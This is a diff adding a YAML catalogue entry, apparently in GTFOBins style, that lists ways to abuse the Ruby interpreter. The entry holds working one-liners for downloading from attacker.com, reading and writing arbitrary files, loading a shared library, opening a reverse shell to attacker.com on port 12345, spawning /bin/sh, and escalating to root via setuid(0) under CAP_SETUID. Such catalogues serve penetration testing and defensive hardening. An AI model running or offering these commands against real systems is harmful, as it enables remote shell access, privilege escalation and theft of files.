@@ -1,0 +1,56 @@
+---
+functions:
+  download:
+  - code: |-
+      ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
+    contexts:
+      sudo:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      ruby -e 'puts File.read("/path/to/input-file")'
+    contexts:
+      sudo:
+      unprivileged:
+  file-write:
+  - code: |-
+      ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
+    contexts:
+      sudo:
+      unprivileged:
+  library-load:
+  - code: |-
+      ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
+    contexts:
+      sudo:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+    contexts:
+      sudo:
+      unprivileged:
+    listener: tcp-server
+    tty: false
+  shell:
+  - code: |-
+      ruby -e 'exec "/bin/sh"'
+    contexts:
+      capabilities:
+        code: |-
+          ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+        list:
+        - CAP_SETUID
+      sudo:
+      unprivileged:
+  upload:
+  - code: |-
+      ruby -run -e httpd . -p 80
+    contexts:
+      sudo:
+      unprivileged:
+    receiver: http-client
+    version: |-
+      >= 1.9.2
+...
